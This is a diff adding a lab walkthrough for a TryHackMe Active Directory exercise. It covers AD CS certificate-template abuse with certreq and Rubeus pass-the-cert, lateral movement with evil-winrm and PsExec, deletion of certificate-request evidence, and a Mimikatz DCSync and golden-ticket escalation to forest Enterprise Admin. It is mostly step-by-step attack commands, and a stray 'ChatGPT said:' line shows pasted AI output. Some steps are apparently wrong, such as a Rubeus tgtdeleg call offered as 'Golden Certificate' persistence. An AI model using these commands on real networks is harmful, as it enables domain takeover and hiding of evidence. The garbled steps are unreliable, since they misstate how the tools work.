@@ -1678,3 +1678,179 @@ gpupdate /force
 ```
 
 RDP into THMSERVER2 using the account added to IT Support. Get the flag at Administrator desktop!
+
+Active Directory Certificate Services (AD CS) is Microsoft's Public Key Infrastructure (PKI) implementation, commonly used for authentication and secure communication. When misconfigured, AD CS can be exploited for privilege escalation and lateral movement within a network. One common attack vector involves vulnerable certificate templates that allow low-privileged users to request certificates with elevated permissions.
+
+By enumerating available certificate templates, attackers can identify those that permit client authentication and enrollment under insecure conditions. If a template allows a user to request a certificate that can be used for authentication without proper constraints, an attacker can obtain a certificate for a high-privilege account, such as a domain administrator. This certificate can then be used to generate a valid Kerberos Ticket Granting Ticket (TGT) or perform pass-the-cert attacks to authenticate as the targeted user.
+
+Another attack involves Enterprise Certificate Authority misconfigurations where low-privileged users can enroll for certificates using a vulnerable template. These templates may grant access to services that allow authentication via certificates, enabling an attacker to impersonate privileged users. AD CS attacks often bypass traditional credential-based authentication protections since they leverage the trust model of certificate-based authentication rather than stolen passwords or hashes.
+
+Once an attacker has obtained a valid certificate for a privileged account, they can authenticate to Active Directory services without triggering password-based security mechanisms. This access can be used to further compromise the environment, maintain persistence, or escalate privileges within the domain. Properly securing AD CS requires restricting template permissions, enforcing strong enrollment policies, and monitoring certificate-related authentication attempts.
+
+On a domain-joined machine, use `certutil` to check if CA exists:
+
+```powershell
+certutil -config - -ping
+```
+
+If a CA is available, it will respond, confirming that AD CS is running.
+
+Certificate templates define how certificates are issued and what permissions users have. Some templates may allow enrollment by unprivileged users or permit Subject Alternative Name (SAN) modification, leading to privilege escalation.
+
+List Certificate Templates:
+
+```powershell
+certutil -TCA <CA-Name>
+```
+
+Look for templates with Client Authentication enabled and misconfigured permissions.
+
+Request a certificate for a privileged user. If a vulnerable template is found, the next step is to request a certificate. Using `certreq`, create a request file (`request.inf`): 
+
+```
+[Version]
+Signature="$Windows NT$"
+
+[NewRequest]
+Subject = "CN=Administrator,OU=Domain Admins,DC=domain,DC=local"
+HashAlgorithm = sha256
+KeyLength = 2048
+Exportable = TRUE
+MachineKeySet = FALSE
+RequestType = PKCS10
+
+[Extensions]
+2.5.29.17 = "{text}dns=Administrator"
+```
+
+Submit the request:
+
+```powershell
+certreq -submit -config "<CA-Name>" request.inf
+```
+
+Once a certificate for a privileged user is obtained, use it to authenticate.
+
+Convert to `.pfx` format:
+
+```bash
+openssl pkcs12 -export -inkey key.pem -in cert.pem -out cert.pfx
+```
+
+Authenticate using Rubeus for pass-the-cert attack:
+
+```powershell
+Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:
+```
+
+With the Kerberos TGT in memory, use it to gain access to privileged systems:
+
+```powershell
+Rubeus.exe ptt /ticket:TGT.kirbi
+```
+
+Now, run privileged commands:
+
+```powershell
+whoami /groups
+```
+
+Use Evil-WinRM to access a Domain Controller:
+
+```bash
+evil-winrm -i 10.200.47.101 -u Administrator -H <NTLM-Hash>
+```
+
+Use PsExec to execute commands remotely:
+
+```powershell
+C:\tools\psexec64.exe \\10.200.47.201 -s cmd.exe
+```
+
+After privilege escalation, remove evidence of certificate requests:
+
+```powershell
+certutil -deleterow <Request-ID>
+```
+
+Persist with Golden Certificates:
+
+```powershell
+Rubeus.exe tgtdeleg /user:Administrator /ticket:cert.pfx
+```
+
+ChatGPT said:
+
+Domain trusts in Active Directory allow users to access resources across different domains within a forest. In this scenario, we initially compromised the ZA.TRYHACKME.LOC domain but aimed to take control of the entire TRYHACKME.LOC forest by exploiting domain trust relationships. Trusts between a parent domain (TRYHACKME.LOC) and child domains (ZA.TRYHACKME.LOC, UK.TRYHACKME.LOC) are bidirectional and transitive, meaning a compromise in one child domain can be escalated to the parent domain.
+
+The KRBTGT account, responsible for handling Kerberos authentication, is crucial in this process. If an attacker gains the KRBTGT password hash from a compromised child domain, they can create a Golden Ticket, forging their own Kerberos Ticket Granting Tickets (TGTs) to authenticate as any user. Using Mimikatz, we dumped the KRBTGT password hash from the ZA domain controller (THMSERVER2). With this, we could forge a Golden Ticket, granting unrestricted access to the compromised domain.
+
+To escalate further, we leveraged Inter-Realm TGTs, which allow authentication between different domains in a trust relationship. By forging a TGT and adding an extra SID corresponding to the Enterprise Admins group of the parent domain, we effectively gained administrative control over the entire forest. After retrieving the necessary SIDs (the child domain controller's SID and the Enterprise Admins group's SID from the parent domain), we used Mimikatz to generate the Golden Ticket. Once the ticket was injected, we verified access to both the child and parent domain controllers, confirming complete control over the forest.
+
+You must have administrative privileges on the ZA.TRYHACKME.LOC domain controller (THMSERVER2). Use a privileged shell (Command Prompt or PowerShell as Administrator).
+
+Dump the KRBTGT password hash using Mimikatz:
+
+```powershell
+C:\tools\mimikatz64.exe
+```
+
+Enable debug privileges:
+
+```
+privilege::debug
+```
+
+Use DCSync to extract the KRBTGT hash:
+
+```
+lsadump::dcsync /user:za\krbtgt
+```
+
+Note down the extracted NTLM hash.
+
+Retrieve the SID of the child domain controller (THMDC):
+
+```powershell
+Get-ADComputer -Identity "THMDC"
+```
+
+Note down the SID from the output.
+
+Retrieve the SID of the Enterprise Admins group in the parent domain:
+
+```powershell
+Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
+```
+
+Note down the retrieved SID.
+
+Generate a forged Golden Ticket with Mimikatz. Run the following command to generate and inject the Golden Ticket:
+
+```
+kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<child domain SID> /service:krbtgt /rc4:<KRBTGT hash> /sids:<Enterprise Admins SID> /ptt
+```
+
+Check if the Golden Ticket was injected successfully:
+
+```powershell
+klist
+```
+
+If successful, you should see a valid Kerberos ticket.
+
+Access the parent domain controller (THMROOTDC). Open a privileged Command Prompt and execute: 
+
+```cmd
+dir \\thmrootdc.tryhackme.loc\c$
+```
+
+If access is granted, you have successfully escalated to the parent domain.
+
+Use Mimikatz to verify Domain Admin or Enterprise Admin group membership:
+
+```
+token::whoami
+```
+
+If Enterprise Admins is listed, you have gained full control over TRYHACKME.LOC
